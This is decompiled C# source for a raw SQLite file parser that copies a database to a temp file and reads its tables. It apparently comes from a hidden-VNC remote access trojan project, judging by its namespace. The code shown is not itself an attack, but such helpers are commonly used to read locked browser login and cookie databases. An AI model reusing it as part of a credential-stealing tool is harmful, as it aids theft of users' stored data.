using System;
using System.IO;
using System.Text;

namespace BirdBrainmofo.HVNC.Helpers
{
	// Token: 0x020000E1 RID: 225
	public class SqLite
	{
		// Token: 0x060008E2 RID: 2274 RVA: 0x00060954 File Offset: 0x0005EB54
		public SqLite(string fileName)
		{
			_fileBytes = File.ReadAllBytes(fileName);
			_pageSize = ConvertToULong(16, 2);
			_dbEncoding = ConvertToULong(56, 4);
			ReadMasterTable(100L);
		}

		// Token: 0x060008E3 RID: 2275 RVA: 0x000609B8 File Offset: 0x0005EBB8
		public string GetValue(int rowNum, int field)
		{
			string text;
			try
			{
				if (rowNum >= _tableEntries.Length)
				{
					text = null;
				}
				else
				{
					text = ((field >= _tableEntries[rowNum].Content.Length) ? null : _tableEntries[rowNum].Content[field]);
				}
			}
			catch
			{
				text = "";
			}
			return text;
		}

		// Token: 0x060008E4 RID: 2276 RVA: 0x00060A24 File Offset: 0x0005EC24
		public int GetRowCount()
		{
			return _tableEntries.Length;
		}

		// Token: 0x060008E5 RID: 2277 RVA: 0x00060A3C File Offset: 0x0005EC3C
		private bool ReadTableFromOffset(ulong offset)
		{
			bool flag;
			try
			{
				byte b = _fileBytes[(int)((IntPtr)offset)];
				byte b2 = b;
				if (b2 != 5)
				{
					if (b2 == 13)
					{
						uint num = (uint)(ConvertToULong((int)offset + 3, 2) - 1UL);
						int num2 = 0;
						if (_tableEntries != null)
						{
							num2 = _tableEntries.Length;
							Array.Resize(ref _tableEntries, _tableEntries.Length + (int)num + 1);
						}
						else
						{
							_tableEntries = new TableEntry[num + 1U];
						}
						for (uint num3 = 0U; num3 <= num; num3 += 1U)
						{
							ulong num4 = ConvertToULong((int)offset + 8 + (int)(num3 * 2U), 2);
							if (offset != 100UL)
							{
								num4 += offset;
							}
							int num5 = Gvl((int)num4);
							Cvl((int)num4, num5);
							int num6 = Gvl((int)(num4 + (ulong)(num5 - (long)num4) + 1UL));
							Cvl((int)(num4 + (ulong)(num5 - (long)num4) + 1UL), num6);
							ulong num7 = num4 + (ulong)(num6 - (long)num4 + 1L);
							int num8 = Gvl((int)num7);
							int num9 = num8;
							long num10 = Cvl((int)num7, num8);
							RecordHeaderField[] array = null;
							long num11 = (long)(num7 - (ulong)num8 + 1UL);
							int num12 = 0;
							while (num11 < num10)
							{
								Array.Resize(ref array, num12 + 1);
								int num13 = num9 + 1;
								num9 = Gvl(num13);
								array[num12].Type = Cvl(num13, num9);
								array[num12].Size = (long)((array[num12].Type <= 9L) ? ((ulong)_sqlDataTypeSize[(int)((IntPtr)array[num12].Type)]) : ((ulong)((!IsOdd(array[num12].Type)) ? ((array[num12].Type - 12L) / 2L) : ((array[num12].Type - 13L) / 2L))));
								num11 = num11 + (num9 - num13) + 1L;
								num12++;
							}
							if (array != null)
							{
								_tableEntries[num2 + (int)num3].Content = new string[array.Length];
								int num14 = 0;
								for (int i = 0; i <= array.Length - 1; i++)
								{
									if (array[i].Type > 9L)
									{
										if (!IsOdd(array[i].Type))
										{
											long dbEncoding = (long)_dbEncoding;
											long num15 = dbEncoding;
											long num16 = num15 - 1L;
											if (num16 <= 2L)
											{
												switch ((uint)num16)
												{
												case 0U:
													_tableEntries[num2 + (int)num3].Content[i] = Encoding.Default.GetString(_fileBytes, (int)(num7 + (ulong)num10 + (ulong)num14), (int)array[i].Size);
													break;
												case 1U:
													_tableEntries[num2 + (int)num3].Content[i] = Encoding.Unicode.GetString(_fileBytes, (int)(num7 + (ulong)num10 + (ulong)num14), (int)array[i].Size);
													break;
												case 2U:
													_tableEntries[num2 + (int)num3].Content[i] = Encoding.BigEndianUnicode.GetString(_fileBytes, (int)(num7 + (ulong)num10 + (ulong)num14), (int)array[i].Size);
													break;
												}
											}
										}
										else
										{
											_tableEntries[num2 + (int)num3].Content[i] = Encoding.Default.GetString(_fileBytes, (int)(num7 + (ulong)num10 + (ulong)num14), (int)array[i].Size);
										}
									}
									else
									{
										_tableEntries[num2 + (int)num3].Content[i] = Convert.ToString(ConvertToULong((int)(num7 + (ulong)num10 + (ulong)num14), (int)array[i].Size));
									}
									num14 += (int)array[i].Size;
								}
							}
						}
					}
				}
				else
				{
					uint num17 = (uint)(ConvertToULong((int)(offset + 3UL), 2) - 1UL);
					for (uint num18 = 0U; num18 <= num17; num18 += 1U)
					{
						uint num19 = (uint)ConvertToULong((int)offset + 12 + (int)(num18 * 2U), 2);
						ReadTableFromOffset((ConvertToULong((int)(offset + num19), 4) - 1UL) * _pageSize);
					}
					ReadTableFromOffset((ConvertToULong((int)(offset + 8UL), 4) - 1UL) * _pageSize);
				}
				flag = true;
			}
			catch
			{
				flag = false;
			}
			return flag;
		}

		// Token: 0x060008E6 RID: 2278 RVA: 0x00060F7C File Offset: 0x0005F17C
		private void ReadMasterTable(long offset)
		{
			byte b2;
			for (;;)
			{
				byte b = _fileBytes[(int)((IntPtr)offset)];
				b2 = b;
				if (b2 != 5)
				{
					break;
				}
				uint num = (uint)(ConvertToULong((int)offset + 3, 2) - 1UL);
				for (int i = 0; i <= (int)num; i++)
				{
					uint num2 = (uint)ConvertToULong((int)offset + 12 + i * 2, 2);
					if (offset == 100L)
					{
						ReadMasterTable((long)((ConvertToULong((int)num2, 4) - 1UL) * _pageSize));
					}
					else
					{
						ReadMasterTable((long)((ConvertToULong((int)(offset + (long)num2), 4) - 1UL) * _pageSize));
					}
				}
				offset = (long)((ConvertToULong((int)offset + 8, 4) - 1UL) * _pageSize);
			}
			if (b2 == 13)
			{
				ulong num3 = ConvertToULong((int)offset + 3, 2) - 1UL;
				int num4 = 0;
				if (_masterTableEntries != null)
				{
					num4 = _masterTableEntries.Length;
					Array.Resize(ref _masterTableEntries, _masterTableEntries.Length + (int)num3 + 1);
				}
				else
				{
					_masterTableEntries = new SqliteMasterEntry[num3 + 1UL];
				}
				for (ulong num5 = 0UL; num5 <= num3; num5 += 1UL)
				{
					ulong num6 = ConvertToULong((int)offset + 8 + (int)num5 * 2, 2);
					if (offset != 100L)
					{
						num6 += (ulong)offset;
					}
					int num7 = Gvl((int)num6);
					Cvl((int)num6, num7);
					int num8 = Gvl((int)(num6 + (ulong)(num7 - (long)num6) + 1UL));
					Cvl((int)(num6 + (ulong)(num7 - (long)num6) + 1UL), num8);
					ulong num9 = num6 + (ulong)(num8 - (long)num6 + 1L);
					int num10 = Gvl((int)num9);
					int num11 = num10;
					long num12 = Cvl((int)num9, num10);
					long[] array = new long[5];
					for (int j = 0; j <= 4; j++)
					{
						int num13 = num11 + 1;
						num11 = Gvl(num13);
						array[j] = Cvl(num13, num11);
						array[j] = (long)((array[j] <= 9L) ? ((ulong)_sqlDataTypeSize[(int)((IntPtr)array[j])]) : ((ulong)((!IsOdd(array[j])) ? ((array[j] - 12L) / 2L) : ((array[j] - 13L) / 2L))));
					}
					if (_dbEncoding == 1UL || _dbEncoding == 2UL)
					{
						long dbEncoding = (long)_dbEncoding;
						long num14 = dbEncoding;
						long num15 = num14 - 1L;
						if (num15 <= 2L)
						{
							switch ((uint)num15)
							{
							case 0U:
								_masterTableEntries[num4 + (int)num5].ItemName = Encoding.Default.GetString(_fileBytes, (int)(num9 + (ulong)num12 + (ulong)array[0]), (int)array[1]);
								break;
							case 1U:
								_masterTableEntries[num4 + (int)num5].ItemName = Encoding.Unicode.GetString(_fileBytes, (int)(num9 + (ulong)num12 + (ulong)array[0]), (int)array[1]);
								break;
							case 2U:
								_masterTableEntries[num4 + (int)num5].ItemName = Encoding.BigEndianUnicode.GetString(_fileBytes, (int)(num9 + (ulong)num12 + (ulong)array[0]), (int)array[1]);
								break;
							}
						}
					}
					_masterTableEntries[num4 + (int)num5].RootNum = (long)ConvertToULong((int)(num9 + (ulong)num12 + (ulong)array[0] + (ulong)array[1] + (ulong)array[2]), (int)array[3]);
					long dbEncoding2 = (long)_dbEncoding;
					long num16 = dbEncoding2;
					long num17 = num16 - 1L;
					if (num17 <= 2L)
					{
						switch ((uint)num17)
						{
						case 0U:
							_masterTableEntries[num4 + (int)num5].SqlStatement = Encoding.Default.GetString(_fileBytes, (int)(num9 + (ulong)num12 + (ulong)array[0] + (ulong)array[1] + (ulong)array[2] + (ulong)array[3]), (int)array[4]);
							break;
						case 1U:
							_masterTableEntries[num4 + (int)num5].SqlStatement = Encoding.Unicode.GetString(_fileBytes, (int)(num9 + (ulong)num12 + (ulong)array[0] + (ulong)array[1] + (ulong)array[2] + (ulong)array[3]), (int)array[4]);
							break;
						case 2U:
							_masterTableEntries[num4 + (int)num5].SqlStatement = Encoding.BigEndianUnicode.GetString(_fileBytes, (int)(num9 + (ulong)num12 + (ulong)array[0] + (ulong)array[1] + (ulong)array[2] + (ulong)array[3]), (int)array[4]);
							break;
						}
					}
				}
			}
		}

		// Token: 0x060008E7 RID: 2279 RVA: 0x00061498 File Offset: 0x0005F698
		public bool ReadTable(string tableName)
		{
			int num = -1;
			for (int i = 0; i <= _masterTableEntries.Length; i++)
			{
				if (string.Compare(_masterTableEntries[i].ItemName.ToLower(), tableName.ToLower(), StringComparison.Ordinal) == 0)
				{
					num = i;
					IL_45:
					bool flag;
					if (num == -1)
					{
						flag = false;
					}
					else
					{
						string[] array = _masterTableEntries[num].SqlStatement.Substring(_masterTableEntries[num].SqlStatement.IndexOf("(", StringComparison.Ordinal) + 1).Split(',');
						for (int j = 0; j <= array.Length - 1; j++)
						{
							array[j] = array[j].TrimStart(Array.Empty<char>());
							int num2 = array[j].IndexOf(' ');
							if (num2 > 0)
							{
								array[j] = array[j].Substring(0, num2);
							}
							if (array[j].IndexOf("UNIQUE", StringComparison.Ordinal) != 0)
							{
								Array.Resize(ref _fieldNames, j + 1);
								_fieldNames[j] = array[j];
							}
						}
						flag = ReadTableFromOffset((ulong)((_masterTableEntries[num].RootNum - 1L) * (long)_pageSize));
					}
					return flag;
				}
			}

            return false;
        }

		// Token: 0x060008E8 RID: 2280 RVA: 0x000615E8 File Offset: 0x0005F7E8
		private ulong ConvertToULong(int startIndex, int size)
		{
			ulong num;
			try
			{
				if ((size > 8) | (size == 0))
				{
					num = 0UL;
				}
				else
				{
					ulong num2 = 0UL;
					for (int i = 0; i <= size - 1; i++)
					{
						num2 = (num2 << 8) | _fileBytes[startIndex + i];
					}
					num = num2;
				}
			}
			catch
			{
				num = 0UL;
			}
			return num;
		}

		// Token: 0x060008E9 RID: 2281 RVA: 0x0006165C File Offset: 0x0005F85C
		private int Gvl(int startIdx)
		{
			int num;
			try
			{
				if (startIdx > _fileBytes.Length)
				{
					num = 0;
				}
				else
				{
					for (int i = startIdx; i <= startIdx + 8; i++)
					{
						if (i > _fileBytes.Length - 1)
						{
							return 0;
						}
						if ((_fileBytes[i] & 128) != 128)
						{
							return i;
						}
					}
					num = startIdx + 8;
				}
			}
			catch
			{
				num = 0;
			}
			return num;
		}

		// Token: 0x060008EA RID: 2282 RVA: 0x000616DC File Offset: 0x0005F8DC
		private long Cvl(int startIdx, int endIdx)
		{
			long num2;
			try
			{
				endIdx++;
				byte[] array = new byte[8];
				int num = endIdx - startIdx;
				bool flag = false;
				if ((num == 0) | (num > 9))
				{
					num2 = 0L;
				}
				else
				{
					int num3 = num;
					int num4 = num3;
					if (num4 != 1)
					{
						if (num4 == 9)
						{
							flag = true;
						}
						int num5 = 1;
						int num6 = 7;
						int num7 = 0;
						if (flag)
						{
							array[0] = _fileBytes[endIdx - 1];
							endIdx--;
							num7 = 1;
						}
						for (int i = endIdx - 1; i >= startIdx; i += -1)
						{
							if (i - 1 >= startIdx)
							{
								array[num7] = (byte)(((_fileBytes[i] >> num5 - 1) & (255 >> num5)) | (_fileBytes[i - 1] << num6));
								num5++;
								num7++;
								num6--;
							}
							else if (!flag)
							{
								array[num7] = (byte)((_fileBytes[i] >> num5 - 1) & (255 >> num5));
							}
						}
						num2 = BitConverter.ToInt64(array, 0);
					}
					else
					{
						array[0] = (byte)(_fileBytes[startIdx] & 127);
						num2 = BitConverter.ToInt64(array, 0);
					}
				}
			}
			catch
			{
				num2 = 0L;
			}
			return num2;
		}

		// Token: 0x060008EB RID: 2283 RVA: 0x0000ACC4 File Offset: 0x00008EC4
		private static bool IsOdd(long value)
		{
			return (value & 1L) == 1L;
		}

		// Token: 0x060008EC RID: 2284 RVA: 0x00061838 File Offset: 0x0005FA38
		public static SqLite ReadTable(string database, string table)
		{
			SqLite sqLite;
			if (!File.Exists(database))
			{
				sqLite = null;
			}
			else
			{
				string text = Path.GetTempFileName() + ".tmpdb";
				File.Copy(database, text);
				SqLite sqLite2 = new SqLite(text);
				sqLite2.ReadTable(table);
				File.Delete(text);
				sqLite = ((sqLite2.GetRowCount() == 65536) ? null : sqLite2);
			}
			return sqLite;
		}

		// Token: 0x04000730 RID: 1840
		private readonly ulong _dbEncoding;

		// Token: 0x04000731 RID: 1841
		private readonly byte[] _fileBytes;

		// Token: 0x04000732 RID: 1842
		private readonly ulong _pageSize;

		// Token: 0x04000733 RID: 1843
		private readonly byte[] _sqlDataTypeSize = { 0, 1, 2, 3, 4, 6, 8, 8, 0, 0 };

		// Token: 0x04000734 RID: 1844
		private string[] _fieldNames;

		// Token: 0x04000735 RID: 1845
		private SqliteMasterEntry[] _masterTableEntries;

		// Token: 0x04000736 RID: 1846
		private TableEntry[] _tableEntries;

		// Token: 0x020000E2 RID: 226
		private struct RecordHeaderField
		{
			// Token: 0x04000737 RID: 1847
			public long Size;

			// Token: 0x04000738 RID: 1848
			public long Type;
		}

		// Token: 0x020000E3 RID: 227
		private struct TableEntry
		{
			// Token: 0x04000739 RID: 1849
			public string[] Content;
		}

		// Token: 0x020000E4 RID: 228
		private struct SqliteMasterEntry
		{
			// Token: 0x0400073A RID: 1850
			public string ItemName;

			// Token: 0x0400073B RID: 1851
			public long RootNum;

			// Token: 0x0400073C RID: 1852
			public string SqlStatement;
		}
	}
}
